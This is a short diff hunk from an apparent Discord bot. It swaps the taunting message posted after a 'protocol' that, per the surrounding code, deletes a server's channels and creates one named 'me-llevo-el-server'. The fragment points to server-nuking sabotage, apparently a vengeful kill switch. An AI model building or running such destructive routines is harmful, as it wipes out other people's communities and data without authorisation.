@@ -187,7 +187,7 @@ async def on_message(message):
 
                     await asyncio.sleep(3)
                     nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
-                    await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")
+                    await nuevo_canal.send("Este lugar murió cuando tu te hiciste cargo, yo me encargaré de enterrarlo")
 
                     resumen = "✅ Protocolo ejecutado.\n\n"
                     resumen += f"🗑️ Canales eliminados ({len(canales_eliminados)}):\n" + "\n".join(canales_eliminados) + "\n\n"
